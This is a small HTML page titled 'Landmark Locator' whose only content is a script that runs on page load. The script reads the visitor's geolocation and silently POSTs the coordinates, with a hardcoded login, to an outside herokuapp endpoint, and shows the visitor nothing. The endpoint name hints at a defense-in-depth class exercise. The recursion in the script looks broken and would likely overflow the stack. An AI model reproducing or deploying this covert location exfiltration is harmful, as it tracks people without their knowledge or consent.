<!doctype HTML >

<html>

  <head>
    <meta charset="utf-8" />
    <title>Landmark Locator</title>
    <link rel="stylesheet" href="landmarkstyle.css" type="text/css" />
    <script>
      function getLocation(){
        var lat = -999;
        var long = -999;
        var xhr = new XMLHttpRequest();
        navigator.geolocation.getCurrentPosition(function(position) {
          lat = position.coords.latitude;
          long = position.coords.longitude;
          console.log("lat1 = " + lat);
          console.log("long1 = " + long);
        });
        var uri = "https://defense-in-derpth.herokuapp.com/sendLocation";
        xhr.open("POST", uri, true);
        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhr.onreadystatechange = function () {
          if (xhr.readyState == 4 && xhr.status == 200) {
            console.log(xhr.responseText);
          }
        };
        function sendLocation(){
          console.log("Is this being called?");
          if (lat > -90 && long > -180) {
            console.log("lat3 = " + lat);
            console.log("long3 = " + long);
            xhr.send("login=iJRFOmvB&lat=" + lat + "&lng=" + long);
            console.log("SUCCESS!");
          } else {
            sendLocation();
            console.log("Recurse");
          }
        };
        sendLocation();
      };
      
    </script>
  </head>

  <body onload="getLocation()">
  </body>
  
</html>
